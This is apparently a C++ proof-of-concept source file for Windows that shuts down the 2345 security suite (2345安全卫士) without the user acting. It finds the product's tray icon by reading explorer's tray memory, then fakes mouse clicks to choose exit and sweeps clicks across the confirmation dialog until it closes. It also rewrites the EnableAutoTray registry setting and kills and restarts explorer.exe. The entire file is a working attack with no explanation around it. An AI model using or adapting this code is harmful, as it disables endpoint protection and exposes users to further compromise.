#include "stdafx.h"
#include <Windows.h>
#include "tlhelp32.h"
#include "commctrl.h"

#define WAIT_TM 100

DWORD GetProcessIdByName(TCHAR* name)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return 0;
	}
	do
	{
		if (_tcsicmp(pe32.szExeFile, name) == 0)
		{
			CloseHandle(hProcessSnap);
			return pe32.th32ProcessID;
		}
	} while (Process32Next(hProcessSnap, &pe32));
	CloseHandle(hProcessSnap);
	return 0;
}

BOOL RightClickProcessTray(DWORD ProcessID)
{
	HANDLE hProcess = NULL;
	PTBBUTTON p = NULL;
	int i = 0;
	_TBBUTTON b = {0};
	HWND hTray = NULL;
	SIZE_T dw = 0;
	DWORD TrayPid = 0;
	RECT r = {0};
	POINT point = {0};
	BOOL Result = FALSE;
	WCHAR btnText[MAX_PATH] = {0};
	CONST WCHAR wndText[] = L"2345安全卫士";
	BOOL ret = FALSE;

	hTray = FindWindowA("Shell_TrayWnd", NULL);
	hTray = FindWindowExA(hTray, 0, "TrayNotifyWnd", NULL);
	hTray = FindWindowExA(hTray, 0, "SysPager", NULL);
	hTray = FindWindowExA(hTray, 0, "ToolbarWindow32", NULL);
	if(hTray==NULL)
		return FALSE;

	GetWindowThreadProcessId(hTray, &TrayPid);
	hProcess = OpenProcess(PROCESS_VM_OPERATION|PROCESS_VM_READ, FALSE, TrayPid);
	if(hProcess==NULL)
		return FALSE;

	p = (PTBBUTTON)VirtualAllocEx(hProcess, NULL, sizeof(b) + sizeof(r) + MAX_PATH*sizeof(WCHAR), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if(p==NULL)
	{
		CloseHandle(hProcess);
		return FALSE;		
	}

	int iCount = (int)SendMessage(hTray, TB_BUTTONCOUNT, 0, 0);	
	for(i = 0; i<= iCount - 1; i++)
	{
		ZeroMemory(&b, sizeof(b));
		BOOL bGetBtn = (BOOL)SendMessage(hTray, TB_GETBUTTON, i, LPARAM(p));
		if(!bGetBtn)
			break;
		BOOL bRead = ReadProcessMemory(hProcess, p, &b, sizeof(b), &dw);
		if(!bRead)
			break;

		int iGetBtnText = (int)SendMessage(hTray, TB_GETBUTTONTEXT, b.idCommand, (LPARAM)(LPARAM(p) + sizeof(b) + sizeof(r)));
		if(iGetBtnText==-1)
			continue;
		bRead = ReadProcessMemory(hProcess, (LPVOID)(LPARAM(p) + sizeof(b) + sizeof(r)), btnText, iGetBtnText*sizeof(WCHAR), &dw);
		if(!bRead)
			continue;

		if(_wcsnicmp(btnText, wndText, wcslen(wndText))!=0)
			continue;

		BOOL bGetItemRc = (BOOL)SendMessage(hTray, TB_GETITEMRECT, i, LPARAM(LPARAM(p) + sizeof(b)));
		ReadProcessMemory(hProcess, (LPVOID)(LPARAM(p) + sizeof(b)), &r, sizeof(r), &dw);
		ClientToScreen(hTray, &point);
		point.x += r.left + 10;
		point.y += r.top + 10;

		SetCursorPos(point.x, point.y);
		mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
		Sleep(5);
		mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);

		Sleep(WAIT_TM);

		SetCursorPos(point.x-30, point.y-20);
		mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);

		Sleep(WAIT_TM);
		HWND hExitWnd = FindWindowW(NULL, L"2345安全卫士提醒您");
		RECT rcEx = {0};
		POINT ptCursor = {0};

		if(hExitWnd)
		{
			GetWindowRect(hExitWnd, &rcEx);
			int nWidth = rcEx.right-rcEx.left;
			int csX = rcEx.left + nWidth/2 + 10;
			int csY = rcEx.bottom - 20;

			//to find the target button, just try it 10 by 10.
			while(1)
			{
				SetCursorPos(csX, csY);
				mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				Sleep(100);
				csX += 10;
				csY -= 10;

				if(FindWindowW(NULL, L"2345安全卫士提醒您")==NULL)
				{
					ret = TRUE;
					break;
				}
				if(csX > rcEx.right || csY < rcEx.top)
					break;
			}				
		}

		break;
	}

	VirtualFreeEx(hProcess, p, 0, MEM_RELEASE);
	CloseHandle(hProcess);
	return ret;
}

//"Always show all icons and notifications on the taskbar", if it's not checked, sometimes poc fails. If it's checked, this step is unneccessary.
VOID PrepareTrayIcon()
{
	HKEY hk = NULL;
	DWORD dwData = 0;
	DWORD cbData = sizeof(DWORD);
	DWORD dwType = REG_DWORD;
	LONG st = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", 0, KEY_READ, &hk);
	if(st!=ERROR_SUCCESS)
		return;
	st = RegQueryValueExA(hk, "EnableAutoTray", 0, &dwType, (LPBYTE)&dwData, &cbData);
	if(st!=ERROR_SUCCESS || dwData==0)
	{
		RegCloseKey(hk);
		return;
	}

	printf("Tray icons are not showed, you can show them manually.");
	RegCloseKey(hk);
	st = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", 0, KEY_SET_VALUE, &hk);
	if(st!=ERROR_SUCCESS)
		return;

	dwData = 0;
	cbData = sizeof(DWORD);
	st = RegSetValueExA(hk, "EnableAutoTray", 0, REG_DWORD, (LPBYTE)&dwData, cbData);
	if(st==ERROR_SUCCESS)
	{
		printf("Or i do it for u~");

		BOOL bTerminated = FALSE;
		for(int j=0; j<10; j++)
		{
			DWORD pidExpl = GetProcessIdByName(_T("explorer.exe"));
			HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pidExpl);
			if(hProc)
			{
				if(TerminateProcess(hProc, 0))
					bTerminated = TRUE;
			}												
		}
		if(bTerminated)
		{
			//WinExec("explorer.exe", SW_SHOW);
			CHAR szCmd[MAX_PATH] = {0};
			STARTUPINFOA si;
			PROCESS_INFORMATION pi;
			ZeroMemory( &si, sizeof(si) );
			si.cb = sizeof(si);
			ZeroMemory( &pi, sizeof(pi) );

			CHAR szExe[MAX_PATH] = { 0 };
			GetWindowsDirectoryA(szExe, MAX_PATH);
			if (szExe[strlen(szExe) - 1] != '\\')
				strcat_s(szExe, MAX_PATH, "\\");
			strcat_s(szExe, MAX_PATH, "explorer.exe");
			CreateProcessA(szExe, szCmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
			for(int k=0; k<10; k++)
			{
				if(GetProcessIdByName(_T("2345SafeTray.exe"))==0)
				{
					Sleep(1000);
				}
				else
				{
					Sleep(3000);
					break;
				}
			}
		}
	}
	printf("\n");

	RegCloseKey(hk);
}

int _tmain(int argc, _TCHAR* argv[])
{
	PrepareTrayIcon();

	for(int i=0; i<5; i++)
	{
		DWORD pid = GetProcessIdByName(_T("2345SafeTray.exe"));
		if(pid==0)
			break;
		BOOL ret = RightClickProcessTray(pid);
		if(ret)
			break;
	}
	return 0;
}

